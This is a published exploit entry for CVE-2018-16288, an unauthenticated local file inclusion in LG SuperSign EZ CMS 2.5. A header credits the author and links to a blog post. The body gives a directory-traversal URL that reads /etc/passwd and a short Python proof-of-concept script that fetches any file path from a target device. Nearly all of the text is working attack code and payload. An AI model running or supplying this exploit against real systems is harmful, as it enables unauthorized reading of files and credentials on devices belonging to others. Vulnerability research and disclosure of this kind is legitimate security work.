# Exploit Title: LG SuperSign EZ CMS 2.5 - Local File Inclusion
# Date: 2018-09-13
# Exploit Author: Alejandro Fanjul
# Vendor Homepage: https://www.lg.com/ar/software-lg-supersign
# Version: SuperSign EZ (CMS)
# Tested on: Web OS 4.0
# CVE : CVE-2018-16288

# More info: http://mamaquieroserpentester.blogspot.com/2018/09/multiple-vulnerabilities-in-lg.html
# Any user can read files from the TV, without authentication due to an existing LFI in the following path:

# http://SuperSign_IP:9080/signEzUI/playlist/edit/upload/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd

# PoC

import requests
import re
from argparse import ArgumentParser

parser = ArgumentParser(description="SuperSign Reboot")
parser.add_argument("-t", "--target", dest="target",
                        help="Target")
parser.add_argument("-p", "--path", dest="filepath",
                        help="path to the file you want to read")

args = parser.parse_args()
path = args.filepath

s = requests.get('http://'+ str(args.target).replace('\n', '') +'/signEzUI/playlist/edit/upload/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'+str(path))
print s.text